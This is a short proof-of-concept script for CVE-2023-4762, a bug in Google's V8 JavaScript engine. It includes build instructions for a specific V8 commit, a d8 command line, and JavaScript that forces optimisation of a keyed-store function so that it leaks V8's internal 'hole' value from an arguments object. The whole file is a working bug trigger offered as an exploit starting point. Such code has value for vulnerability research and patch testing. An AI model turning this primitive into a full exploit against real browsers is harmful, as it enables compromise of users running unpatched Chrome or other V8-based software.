// CVE-2023-4762 poc
// author: @buptsb

/*
1. Build
```
git checkout fcac1bdaf2ad5995647b4e7a173df2674aea07d8
gclient sync
ninja -j16 d8
```

2. Run
```
./d8 --allow-natives-syntax --trace-turbo --trace-deopt --log-ic ./poc.js
```
*/

function keyed_store(obj, key, value) {
  obj[key] = value;
}

class A {}
let a = new A();

let genArgs = function() { return arguments };

%EnsureFeedbackVectorForFunction(keyed_store);
keyed_store(a, "foo", 1);
keyed_store(genArgs(), "foo", 1);
keyed_store([], 0, 1);

// %DebugPrint(keyed_store);

%PrepareFunctionForOptimization(keyed_store);
%OptimizeFunctionOnNextCall(keyed_store);

let args = genArgs();
keyed_store(args, 0, 1);

let hole = args[args.length+1];
%DebugPrint(%StrictEqual(hole, %TheHole()));
